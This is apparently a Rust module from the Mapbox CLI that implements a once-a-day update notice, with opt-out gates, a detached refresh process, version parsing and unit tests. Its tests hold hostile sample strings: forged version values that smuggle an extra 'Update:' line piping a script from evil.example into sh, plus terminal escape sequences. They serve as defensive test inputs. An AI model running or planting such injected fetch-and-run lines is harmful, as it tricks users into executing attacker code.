//! Telling someone their `mapbox` is out of date.
//!
//! This CLI cannot update itself and there is no channel back to an installed
//! copy: withdrawing a release protects the next install, not the people who
//! installed during the window. A version check is the only thing that turns
//! "we cannot reach them" into "they find out the next time they run it".
//!
//! It is also **the only request this binary makes that the user did not
//! ask for**, which is why every part of it below is a decision rather than
//! a default.
//!
//! # The shape
//!
//! The notice a run prints comes from a **cache**; the **fetch** that fills
//! that cache happens in a detached child process spawned on the way out.
//! Nothing about the command the user ran waits on a socket — not its exit
//! code, not its output, and not its timing. A machine with no route to the
//! channel behaves exactly as it does today: the child hangs and is killed by
//! its own budget, in a process nobody is waiting for, and the command it was
//! spawned by finished before it started.
//!
//! The cost of that is one run of latency: the first stale run refreshes the
//! cache and says nothing, and the run after it is the one that tells you.
//! For a notice about a release that landed at some point in the last day,
//! that is not a cost worth adding a network round-trip to the hot path to
//! avoid.
//!
//! # What has to be true, all five
//!
//! [`enabled`] is the single predicate, and it is pure so every branch is
//! testable:
//!
//! - **A public channel to ask.** Only production is ungated;
//!   dev and staging answer `401` without
//!   `MAPBOX_CLI_AUTH`, and this never sends a credential on a request the
//!   user did not type. So only a production build checks — a dev build, a
//!   staging build and `cargo build` make no request at all. The channel is
//!   compiled in from `MAPBOX_CLI_BUILD_ENV`, read at compile time via
//!   `option_env!`, the same way an official release pipeline distinguishes
//!   staging from production.
//! - **Someone watching.** stderr must be a terminal. A notice nobody reads
//!   is noise in a CI log, and the request behind it is the one a scripted
//!   environment has the least reason to make. This is what keeps the check
//!   off build machines without anyone having to configure it.
//! - **`MAPBOX_NO_UPDATE_CHECK` unset.** The dedicated switch, for a session.
//! - **`MAPBOX_CLI_NO_TELEMETRY` unset.** It silences this too, deliberately. The
//!   request carries nothing about the user — no token, no account, no
//!   command — but it does reveal that a machine is running this CLI, and
//!   somebody who has said "send nothing" has answered that question
//!   already. The two are still separate switches, because wanting the
//!   notice while opting out of markers is a coherent position and
//!   `MAPBOX_NO_UPDATE_CHECK` is how you take the opposite one.
//! - **`mapbox config get update-check` reads `on`.** The persisted
//!   equivalent of `MAPBOX_NO_UPDATE_CHECK`, for someone who wants it off in
//!   every shell rather than the one it was set in — see [`crate::config`].
//!
//! # Where the state lives
//!
//! `<config dir>/update-check.json`, beside the credentials, through the
//! same [`crate::auth::write_private`] that writes those — atomically, and
//! `0600`. Reading goes through [`crate::auth::config_dir_path`], which
//! resolves the path *without* creating anything: a command that would print
//! no notice must not leave a directory behind as the trace of having
//! considered it.
//!
//! Two timestamps, answering two different questions. `checked_at` paces the
//! request (once a day). `notified_at` paces the notice (also once a day),
//! because a stale binary that printed three lines on every command until
//! its owner updated would be a reason to set the switch rather than to
//! update.

use std::io::IsTerminal;
use std::path::PathBuf;
use std::process::{Command, ExitCode, Stdio};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};

use crate::auth;
use crate::http;
use crate::output;

/// The dedicated opt-out. Documented in README beside `MAPBOX_CLI_NO_TELEMETRY`.
pub const NO_UPDATE_CHECK_ENV: &str = "MAPBOX_NO_UPDATE_CHECK";

/// Set by [`notify`] on the child it spawns, and read by [`is_refresh_child`]
/// at the top of `main`. It is what makes the refresher a mode of this binary
/// rather than a subcommand: a hidden subcommand would still be in the
/// `Command` tree, which means in `--schema`, in `docs/commands.md` and in
/// the generated skills — a whole public surface for something no one should
/// ever type.
const REFRESH_ENV: &str = "MAPBOX_INTERNAL_UPDATE_REFRESH";

/// The manifest to ask, overriding the compiled-in channel.
///
/// The parent passes it to the child rather than letting the child work it
/// out, so there is one answer per run. It is also the seam
/// `tests/update_check.rs` drives the whole loop through, against a loopback
/// server — without it, nothing here could be tested end to end until the
/// production channel is serving.
const URL_ENV: &str = "MAPBOX_INTERNAL_UPDATE_URL";

const CACHE_FILE: &str = "update-check.json";

/// How often the channel is asked, and how often a stale binary says so.
/// Both a day, for different reasons — see the module docs.
const CHECK_EVERY: Duration = Duration::from_secs(24 * 60 * 60);
const NOTIFY_EVERY: Duration = Duration::from_secs(24 * 60 * 60);

/// The child's whole budget. Deliberately not `http::REQUEST_TIMEOUT` and
/// deliberately not `MAPBOX_TIMEOUT`: this is a 300-byte JSON document on a
/// CDN, nobody is waiting for it, and a caller who raised the timeout for a
/// sprite upload did not mean to raise it for this.
const FETCH_TIMEOUT: Duration = Duration::from_secs(5);

/// The one public channel, and the one this ever asks.
///
/// The same domain the installers download from. Which channel is served
/// from which domain is decided by Mapbox's release tooling and not here, so
/// this is a second copy of a value this crate cannot derive;
/// `the_production_url_matches_the_installers` cross-checks it where that
/// tooling is reachable, and a maintainer is who can confirm it otherwise.
const PRODUCTION_BASE_URL: &str = "https://cli.mapbox.com";

/// The version this binary is, which is what `mapbox --version` prints.
const CURRENT: &str = env!("CARGO_PKG_VERSION");

/// What the last check found, and when.
#[derive(Debug, Default, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct Cache {
    /// Unix seconds of the last completed fetch. Paces the request.
    #[serde(default)]
    checked_at: u64,
    /// Unix seconds of the last notice printed. Paces the notice.
    #[serde(default)]
    notified_at: u64,
    /// The version the channel reported. Absent until a fetch succeeds.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    latest: Option<String>,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or_default()
}

/// The environment as three answers, so [`enabled`] can stay pure.
fn from_environment(name: &str) -> Option<String> {
    std::env::var(name)
        .ok()
        .filter(|value| !value.trim().is_empty())
}

/// Whether this run may check at all.
///
/// Pure, and takes every input as an argument, because the interesting cases
/// are exactly the ones a test process cannot be: a production build, a
/// terminal on stderr. See the module docs for why each of the five is here.
/// The fifth, `config_allows`, is [`crate::config::update_check_enabled`] —
/// `MAPBOX_NO_UPDATE_CHECK` and `mapbox config set update-check off` are two
/// ways to say the same thing, and either saying it is enough.
fn enabled(
    manifest_url: Option<&str>,
    stderr_is_terminal: bool,
    no_update_check: Option<&str>,
    telemetry_allowed: bool,
    config_allows: bool,
) -> bool {
    manifest_url.is_some()
        && stderr_is_terminal
        && no_update_check.is_none()
        && telemetry_allowed
        && config_allows
}

/// The manifest this build would ask, or `None` for a build with no public
/// channel behind it.
///
/// `MAPBOX_CLI_BUILD_ENV` is read with `option_env!`, so for every build
/// outside the release pipeline this is a compile-time `None` and everything
/// below it is dead weight the optimiser removes.
fn manifest_url() -> Option<String> {
    if let Some(override_url) = from_environment(URL_ENV) {
        return Some(override_url);
    }
    match option_env!("MAPBOX_CLI_BUILD_ENV") {
        // Only production. Staging and dev sit behind basic auth at the
        // edge, and this does not send credentials.
        Some("production") => Some(format!("{PRODUCTION_BASE_URL}/latest/manifest.json")),
        _ => None,
    }
}

fn cache_path() -> Option<PathBuf> {
    Some(auth::config_dir_path()?.join(CACHE_FILE))
}

/// The cache, or `None` when there is not a readable one.
///
/// A malformed file reads as absent rather than as an error: the worst it can
/// cost is one refresh, and there is no version of this feature worth
/// failing a command over.
fn read_cache() -> Option<Cache> {
    let text = std::fs::read_to_string(cache_path()?).ok()?;
    serde_json::from_str(&text).ok()
}

/// Best-effort, and silent on failure for the same reason `read_cache` is
/// forgiving: a read-only home directory must not turn into an error on a
/// command that had nothing to do with this.
fn write_cache(cache: &Cache) {
    let Ok(dir) = auth::config_dir() else { return };
    let Ok(text) = serde_json::to_string(cache) else {
        return;
    };
    let _ = auth::write_private(&dir.join(CACHE_FILE), &text);
}

/// Whether the channel should be asked again.
fn should_refresh(cache: Option<&Cache>, now: u64) -> bool {
    match cache {
        None => true,
        Some(cache) => now.saturating_sub(cache.checked_at) >= CHECK_EVERY.as_secs(),
    }
}

/// Whether a version from the channel is one this CLI will repeat aloud.
///
/// The notice interpolates this into text a reader is meant to copy and run:
///
/// ```text
/// A newer mapbox is available: 0.3.0 (this is 0.1.5).
/// Update: curl -fsSL https://cli.mapbox.com/install.sh | sh
/// Silence this: MAPBOX_NO_UPDATE_CHECK=1
/// ```
///
/// A value carrying newlines could therefore add lines of its own — a second
/// `Update:` naming somewhere else would be indistinguishable from the real
/// one. Of everything this CLI prints, the update notice is the line most
/// meant to be acted on, which is what makes forging it worth more than noise
/// on stderr.
///
/// So the shape is restricted rather than the content sanitized: ASCII
/// alphanumerics, `.`, `-` and `+`, bounded. That admits `0.2.0` and
/// `0.1.3-dev.abc1234`, which is everything the channel publishes, and admits
/// no character that could begin a line or move a cursor.
///
/// Checked in two places on purpose. `fetch_latest` applies it so an
/// implausible version is never written to the cache; this function applies it
/// again because the cache is a file on disk, and a check that only ran at
/// fetch time would be bypassed by a cache written before this existed, or
/// edited afterwards.
fn is_plausible_version(value: &str) -> bool {
    /// Long enough for `0.1.3-dev.` and a full commit sha, with room over.
    const LONGEST: usize = 64;

    !value.is_empty()
        && value.len() <= LONGEST
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+'))
}

/// The version to point at, if this run is the one that should say so.
fn should_notify<'a>(cache: Option<&'a Cache>, current: &str, now: u64) -> Option<&'a str> {
    let cache = cache?;
    let latest = cache
        .latest
        .as_deref()
        .filter(|v| is_plausible_version(v))?;
    if !is_newer(latest, current) {
        return None;
    }
    (now.saturating_sub(cache.notified_at) >= NOTIFY_EVERY.as_secs()).then_some(latest)
}

/// `major.minor.patch`, and whether a pre-release suffix followed.
///
/// Hand-rolled rather than taking the `semver` crate on for one comparison.
/// What it has to get right is narrow and pinned by
/// `a_newer_release_is_newer_and_nothing_else_is`: the numeric ordering, and
/// that `0.2.0` beats `0.2.0-dev.abc1234` — which is the whole reason the
/// pre-release flag is carried at all, since a dev-channel version is
/// spelled exactly that way. Ordering two *different* pre-releases is not
/// attempted, because nothing publishes two.
fn parse_version(text: &str) -> Option<(u64, u64, u64, bool)> {
    let text = text.trim().trim_start_matches('v');
    // Build metadata never affects precedence, so it goes before anything
    // else is read.
    let text = text.split('+').next()?;
    let (core, pre) = match text.split_once('-') {
        Some((core, pre)) => (core, !pre.is_empty()),
        None => (text, false),
    };

    let mut parts = core.split('.');
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next()?.parse().ok()?;
    let patch = parts.next()?.parse().ok()?;
    // A fourth component is not a version this project publishes, and
    // guessing at one would be inventing an ordering.
    if parts.next().is_some() {
        return None;
    }
    Some((major, minor, patch, pre))
}

/// Whether `candidate` is a version worth telling someone about.
///
/// Anything unparseable on either side answers `false`. That is the safe
/// direction: a channel that starts publishing a version string this cannot
/// read stays quiet, rather than telling everyone they are behind.
fn is_newer(candidate: &str, current: &str) -> bool {
    let (Some(new), Some(mine)) = (parse_version(candidate), parse_version(current)) else {
        return false;
    };
    let (new_core, new_pre) = ((new.0, new.1, new.2), new.3);
    let (my_core, my_pre) = ((mine.0, mine.1, mine.2), mine.3);

    match new_core.cmp(&my_core) {
        std::cmp::Ordering::Greater => true,
        std::cmp::Ordering::Less => false,
        // Same numbers: the only way the channel is ahead is that this
        // binary is a pre-release of exactly that version and the channel is
        // publishing the real thing.
        std::cmp::Ordering::Equal => my_pre && !new_pre,
    }
}

/// The notice, built separately from being printed so it can be read in a
/// test — the shape `deprecation.rs` uses, and for the same reason.
///
/// Three lines, and the third earns its place: a notice that cannot be turned
/// off is a reason to distrust the tool, and the switch is no use to anyone
/// who has to go and find it.
fn notice(latest: &str, current: &str, windows: bool) -> String {
    let update = if windows {
        format!("irm {PRODUCTION_BASE_URL}/install.ps1 | iex")
    } else {
        format!("curl -fsSL {PRODUCTION_BASE_URL}/install.sh | sh")
    };
    format!(
        "A newer mapbox is available: {latest} (this is {current}).\n\
         Update: {update}\n\
         Silence this: {NO_UPDATE_CHECK_ENV}=1"
    )
}

/// Whether this process is the refresher rather than a command.
pub fn is_refresh_child() -> bool {
    from_environment(REFRESH_ENV).is_some()
}

/// The whole of the child: ask the manifest, write the cache, say nothing.
///
/// Always succeeds. Its exit code is read by nobody — the parent does not
/// wait for it and is usually gone before it finishes — and a refresher that
/// could fail would only be a way for this feature to produce a broken pipe
/// or a stray line on somebody's terminal.
///
/// The opt-outs are honored here too, not only in [`notify`] which spawned
/// it. Belt and braces: this is the process that makes the request, and the
/// switch that says "make no request" should be read by it.
pub fn run_refresh_child() -> ExitCode {
    if from_environment(NO_UPDATE_CHECK_ENV).is_some()
        || !crate::telemetry::telemetry_allowed()
        || !crate::config::update_check_enabled()
    {
        return ExitCode::SUCCESS;
    }
    if let Some(url) = manifest_url() {
        if let Some(latest) = fetch_latest(&url) {
            let previous = read_cache().unwrap_or_default();
            write_cache(&Cache {
                checked_at: now(),
                // Carried over rather than reset: the fetch is not the
                // notice, and resetting this would let a daily refresh
                // silence the daily notice for ever.
                notified_at: previous.notified_at,
                latest: Some(latest),
            });
        }
    }
    ExitCode::SUCCESS
}

/// The `version` field of the channel manifest, or `None` for any failure at
/// all — no network, a `401`, a 500, a body that is not the manifest.
///
/// The channel manifest documents the shape; `version` is the only field
/// this reads, and it carries no leading `v`.
fn fetch_latest(url: &str) -> Option<String> {
    let response = http::send(http::client().ok()?.get(url).timeout(FETCH_TIMEOUT)).ok()?;
    if !response.status().is_success() {
        return None;
    }
    let manifest: serde_json::Value = response.json().ok()?;
    let version = manifest.get("version")?.as_str()?.trim();
    is_plausible_version(version).then(|| version.to_string())
}

/// Called once, on the way out of `main`, after the result and any error have
/// been rendered.
///
/// Prints at most three lines to stderr and spawns at most one detached
/// child. Everything it does is best-effort: there is no path from here to a
/// non-zero exit code, and none to a delay.
pub fn notify() {
    let Some(url) = manifest_url() else { return };
    if !enabled(
        Some(&url),
        std::io::stderr().is_terminal(),
        from_environment(NO_UPDATE_CHECK_ENV).as_deref(),
        crate::telemetry::telemetry_allowed(),
        crate::config::update_check_enabled(),
    ) {
        return;
    }

    let cache = read_cache();
    let now = now();

    // The notice first, from what is already known. It has to come before the
    // spawn so that a run which both reports and refreshes reports the version
    // it had, rather than racing a child that may finish first.
    if let Some(latest) = should_notify(cache.as_ref(), CURRENT, now) {
        output::progress(&notice(latest, CURRENT, cfg!(windows)));
        crate::telemetry_event::set_update_notice(latest);
        let mut updated = cache.clone().unwrap_or_default();
        updated.notified_at = now;
        write_cache(&updated);
    }

    if should_refresh(cache.as_ref(), now) {
        spawn_refresh(&url);
    }
}

/// Starts the refresher and forgets it.
///
/// Detached on both platforms, for the same reason: this process is about to
/// exit, and the child must neither hold the terminal nor die with it.
/// `process_group(0)` on Unix takes it out of the shell's job control, so a
/// `^C` aimed at the command that spawned it does not also kill it; the
/// Windows flags are the pair `uninstall.rs` uses, and `CREATE_NO_WINDOW` is
/// what keeps a console from flashing up for something nobody is meant to
/// see.
///
/// All three streams are `/dev/null`. The child prints nothing by design, but
/// "by design" is not the same as "cannot", and a stray byte on the parent's
/// stderr after it has exited would land in the next prompt.
fn spawn_refresh(url: &str) {
    let Ok(exe) = std::env::current_exe() else {
        return;
    };

    let mut command = Command::new(exe);
    command
        .env(REFRESH_ENV, "1")
        .env(URL_ENV, url)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        command.process_group(0);
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const DETACHED_PROCESS: u32 = 0x0000_0008;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        command.creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW);
    }

    // Not waited on, and not reaped: the parent is one statement from
    // exiting, at which point the child is reparented and finishes on its
    // own. A failure to spawn is a run that prints nothing, which is what
    // every other failure here also is.
    let _ = command.spawn();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_newer_release_is_newer_and_nothing_else_is() {
        // (candidate, current, newer?)
        let cases = [
            ("0.2.0", "0.1.5", true),
            ("0.1.6", "0.1.5", true),
            ("1.0.0", "0.9.9", true),
            ("0.1.5", "0.1.5", false),
            ("0.1.4", "0.1.5", false),
            ("0.1.5", "0.2.0", false),
            ("0.9.9", "1.0.0", false),
            // The dev channel's own spelling: the release beats the
            // pre-release of the same number, and not the other way round.
            ("0.1.5", "0.1.5-dev.abc1234", true),
            ("0.1.5-dev.abc1234", "0.1.5", false),
            ("0.1.5-dev.abc1234", "0.1.5-dev.0000000", false),
            ("0.1.6-dev.abc1234", "0.1.5", true),
            // Build metadata never decides precedence.
            ("0.1.5+build.7", "0.1.5", false),
            // Anything unreadable stays quiet rather than crying wolf.
            ("", "0.1.5", false),
            ("latest", "0.1.5", false),
            ("0.1", "0.1.5", false),
            ("0.1.5.1", "0.1.5", false),
            ("0.2.0", "not-a-version", false),
        ];
        for (candidate, current, expected) in cases {
            assert_eq!(
                is_newer(candidate, current),
                expected,
                "is_newer({candidate:?}, {current:?})"
            );
        }
    }

    #[test]
    fn a_leading_v_is_tolerated_on_either_side() {
        // Nothing publishes one in `version` — the manifest strips it — but a
        // tag does, and a hand-written cache might.
        assert!(is_newer("v0.2.0", "0.1.5"));
        assert!(!is_newer("v0.1.5", "v0.1.5"));
    }

    /// Every one of the five has to hold, and each one alone has to be able
    /// to stop it. Written as a loop over which condition is broken so a
    /// sixth condition added later cannot be silently untested.
    #[test]
    fn every_gate_alone_is_enough_to_stop_it() {
        let url = Some("https://cli.mapbox.com/latest/manifest.json");
        assert!(enabled(url, true, None, true, true), "all five hold");

        assert!(!enabled(None, true, None, true, true), "no public channel");
        assert!(
            !enabled(url, false, None, true, true),
            "stderr is not a terminal"
        );
        assert!(
            !enabled(url, true, Some("1"), true, true),
            "MAPBOX_NO_UPDATE_CHECK is set"
        );
        assert!(
            !enabled(url, true, None, false, true),
            "MAPBOX_CLI_NO_TELEMETRY is set"
        );
        assert!(
            !enabled(url, true, None, true, false),
            "mapbox config set update-check off"
        );
    }

    /// The switch is a switch, not a value: `MAPBOX_NO_UPDATE_CHECK=0` is
    /// somebody trying to *keep* the check, and `=1` and `=please-stop` mean
    /// the same thing. `from_environment` treats only unset and whitespace as
    /// absent, so this documents where that line falls.
    #[test]
    fn any_non_empty_value_of_the_switch_is_an_opt_out() {
        let url = Some("https://cli.mapbox.com/latest/manifest.json");
        for value in ["1", "true", "0", "no", "please-stop"] {
            assert!(
                !enabled(url, true, Some(value), true, true),
                "{value:?} did not opt out"
            );
        }
    }

    #[test]
    fn a_build_outside_production_has_no_channel_to_ask() {
        // This test binary is one such build: `MAPBOX_CLI_BUILD_ENV` is unset
        // under `cargo test`, so the compiled-in half is `None` and the only
        // way a URL appears is the test seam.
        assert!(
            option_env!("MAPBOX_CLI_BUILD_ENV").is_none(),
            "the suite is meant to run as a dev build"
        );
        assert_eq!(std::env::var_os(URL_ENV), None);
        assert_eq!(manifest_url(), None);
    }

    /// Holds `PRODUCTION_BASE_URL` against the release tooling that decides
    /// which domain serves which channel — the installers are handed their
    /// copy at publish time, this binary cannot be, so the value exists twice
    /// and this fails if the two ever disagree.
    ///
    /// That tooling is Mapbox-internal and lives one level above this crate,
    /// so this runs in a maintainer checkout and is a no-op in a checkout of
    /// this crate alone: there is no second copy there to disagree with, and
    /// confirming this one is current is something only a maintainer can do.
    #[test]
    fn the_production_url_matches_the_installers() {
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../scripts/env-base-url.sh");
        let Ok(script) = std::fs::read_to_string(&path) else {
            return;
        };

        let line = script
            .lines()
            .find(|line| line.trim_start().starts_with("production)"))
            .expect("the script names a production channel");

        assert!(
            line.contains(PRODUCTION_BASE_URL),
            "{} serves production from {line:?}, and this module asks \
             {PRODUCTION_BASE_URL}",
            path.display()
        );
    }

    fn cache(checked_at: u64, notified_at: u64, latest: &str) -> Cache {
        Cache {
            checked_at,
            notified_at,
            latest: Some(latest.to_string()),
        }
    }

    const DAY: u64 = 24 * 60 * 60;

    #[test]
    fn the_channel_is_asked_once_a_day_and_on_the_first_run() {
        let now = 10 * DAY;
        assert!(should_refresh(None, now), "no cache at all");
        assert!(should_refresh(Some(&cache(9 * DAY, 0, "0.1.5")), now));
        assert!(!should_refresh(Some(&cache(now - 60, 0, "0.1.5")), now));
        // A clock that went backwards is not a reason to hammer the channel
        // or to stop asking it: saturating arithmetic makes it one quiet day.
        assert!(!should_refresh(Some(&cache(now + DAY, 0, "0.1.5")), now));
    }

    #[test]
    fn a_stale_binary_says_so_once_a_day() {
        let now = 10 * DAY;

        // Nothing to say without a cache, or before a fetch has filled one.
        assert_eq!(should_notify(None, "0.1.5", now), None);
        assert_eq!(
            should_notify(Some(&Cache::default()), "0.1.5", now),
            None,
            "a cache with no version in it yet"
        );

        // Stale, and not yet mentioned today.
        assert_eq!(
            should_notify(Some(&cache(now, 0, "0.2.0")), "0.1.5", now),
            Some("0.2.0")
        );
        // Already mentioned an hour ago.
        assert_eq!(
            should_notify(Some(&cache(now, now - 3600, "0.2.0")), "0.1.5", now),
            None
        );
        // Mentioned yesterday, still stale.
        assert_eq!(
            should_notify(Some(&cache(now, now - DAY, "0.2.0")), "0.1.5", now),
            Some("0.2.0")
        );
        // Current, however long ago it was last mentioned.
        assert_eq!(
            should_notify(Some(&cache(now, 0, "0.1.5")), "0.1.5", now),
            None
        );
        // Behind the channel is not the same as ahead of it: a build from
        // `develop` is newer than what production serves, and must not be
        // told to downgrade.
        assert_eq!(
            should_notify(Some(&cache(now, 0, "0.1.5")), "0.2.0", now),
            None
        );
    }

    #[test]
    fn the_notice_names_both_versions_the_way_out_and_the_way_off() {
        let unix = notice("0.2.0", "0.1.5", false);
        assert!(unix.contains("0.2.0") && unix.contains("0.1.5"), "{unix}");
        assert!(unix.contains("curl -fsSL"), "{unix}");
        assert!(unix.contains(PRODUCTION_BASE_URL), "{unix}");
        assert!(unix.contains(NO_UPDATE_CHECK_ENV), "{unix}");
        assert_eq!(unix.lines().count(), 3, "{unix}");

        // The Windows installer is a different command, and telling a
        // PowerShell user to run `curl | sh` is telling them nothing.
        let windows = notice("0.2.0", "0.1.5", true);
        assert!(windows.contains("irm"), "{windows}");
        assert!(windows.contains("install.ps1"), "{windows}");
        assert!(!windows.contains("curl"), "{windows}");
    }

    /// The cache is written by one version of this binary and read by the
    /// next, so its field names are a contract with a file already on disk.
    #[test]
    fn the_cache_round_trips_and_tolerates_a_partial_one() {
        let written = serde_json::to_string(&cache(1, 2, "0.2.0")).expect("serialize");
        assert_eq!(
            written,
            r#"{"checked_at":1,"notified_at":2,"latest":"0.2.0"}"#
        );
        let read: Cache = serde_json::from_str(&written).expect("deserialize");
        assert_eq!(read, cache(1, 2, "0.2.0"));

        // A file written before a field existed, and one written after a
        // field is dropped, both have to read rather than throw the cache
        // away — `read_cache` treats a parse failure as no cache, which
        // would silently mean one extra fetch per run.
        let old: Cache = serde_json::from_str(r#"{"checked_at":7}"#).expect("a partial cache");
        assert_eq!(old.checked_at, 7);
        assert_eq!(old.latest, None);
        let newer: Cache =
            serde_json::from_str(r#"{"checked_at":7,"notified_at":8,"latest":"0.3.0","extra":1}"#)
                .expect("an unknown field is ignored");
        assert_eq!(newer.latest.as_deref(), Some("0.3.0"));
    }

    // The only `unsafe` in the crate, and it is here rather than in anything
    // that ships: `env::set_var` is unsafe because another thread may be
    // reading the environment, and this test is single-threaded within itself
    // and puts the variable back. The crate denies `unsafe_code` so that this
    // stays the exception it is.
    #[allow(unsafe_code)]
    #[test]
    fn an_empty_or_blank_variable_is_not_set() {
        // `export MAPBOX_NO_UPDATE_CHECK=` is how a shell clears one, and it
        // must not read as an opt-out — the same rule `MAPBOX_OUTPUT` and
        // `MAPBOX_CLI_NO_TELEMETRY` follow.
        let name = "MAPBOX_UPDATE_CHECK_BLANK_PROBE";
        // SAFETY: a variable this test owns, read only here.
        unsafe {
            std::env::set_var(name, "   ");
        }
        assert_eq!(from_environment(name), None);
        unsafe {
            std::env::set_var(name, " value ");
        }
        assert_eq!(from_environment(name).as_deref(), Some(" value "));
        unsafe {
            std::env::remove_var(name);
        }
        assert_eq!(from_environment(name), None);
    }

    /// Every shape the channel actually publishes has to keep working — this
    /// is a restriction on a value the CLI does not control, so being too
    /// strict silences legitimate notices.
    #[test]
    fn the_versions_the_channel_publishes_are_all_plausible() {
        for version in [
            "0.2.0",
            "0.1.8",
            "1.0.0",
            "0.1.3-dev.abc1234",
            "0.2.0-rc.1",
            "10.20.30",
            "0.2.0+build.5",
        ] {
            assert!(is_plausible_version(version), "{version}");
        }
    }

    /// **The one that matters.** The notice is three lines, and a version
    /// carrying a newline can write a fourth — a second `Update:` line naming
    /// somewhere else reads exactly like the real one.
    #[test]
    fn a_version_cannot_add_a_line_to_the_notice() {
        // `+` is what makes this reach the notice at all: `parse_version`
        // discards build metadata before comparing, so the payload is
        // invisible to `is_newer` and still printed in full. Without the
        // guard this renders an attacker's `Update:` line *above* the real
        // one — a reader copying the first would run theirs.
        let forged = "0.3.0+\nUpdate: curl -fsSL https://evil.example/install.sh | sh";
        assert!(is_newer(forged, "0.1.5"), "it really would have been shown");
        assert!(!is_plausible_version(forged));

        // And the refusal is what keeps it out of the notice, not luck about
        // how the text happens to be assembled.
        let cache = cache(0, 0, forged);
        assert_eq!(
            should_notify(Some(&cache), "0.1.5", NOTIFY_EVERY.as_secs()),
            None
        );
    }

    /// Carriage returns move a terminal's cursor to the start of the line, so
    /// a version can overwrite what was already printed without a newline at
    /// all. Escape sequences do worse.
    #[test]
    fn nothing_that_can_move_a_cursor_is_plausible() {
        for hostile in [
            "0.3.0\rUpdate: curl https://evil.example | sh",
            "0.3.0\u{1b}[2K\u{1b}[1GUpdate: nonsense",
            "0.3.0\u{0}",
            "0.3.0 and some prose",
            "0.3.0\u{7}",
        ] {
            assert!(!is_plausible_version(hostile), "{hostile:?}");
        }
    }

    /// Unbounded, a version is a way to fill someone's terminal.
    #[test]
    fn an_implausibly_long_version_is_refused() {
        assert!(!is_plausible_version(&"9".repeat(65)));
        assert!(is_plausible_version(&"9".repeat(64)));
        assert!(!is_plausible_version(""));
    }

    /// The cache is a file on disk. A check that only ran when the manifest
    /// was fetched would be bypassed by one written before that check existed,
    /// or edited afterwards — so `should_notify` re-checks rather than
    /// trusting what it reads.
    #[test]
    fn a_cache_on_disk_cannot_smuggle_a_version_past_the_check() {
        let poisoned = cache(0, 0, "0.3.0+\nUpdate: curl https://evil.example | sh");
        assert_eq!(
            should_notify(Some(&poisoned), "0.1.5", NOTIFY_EVERY.as_secs()),
            None
        );

        // The same cache with a plausible version still notifies, so the guard
        // is what refused it and not the surrounding conditions.
        let clean = cache(0, 0, "0.3.0");
        assert_eq!(
            should_notify(Some(&clean), "0.1.5", NOTIFY_EVERY.as_secs()),
            Some("0.3.0")
        );
    }
}
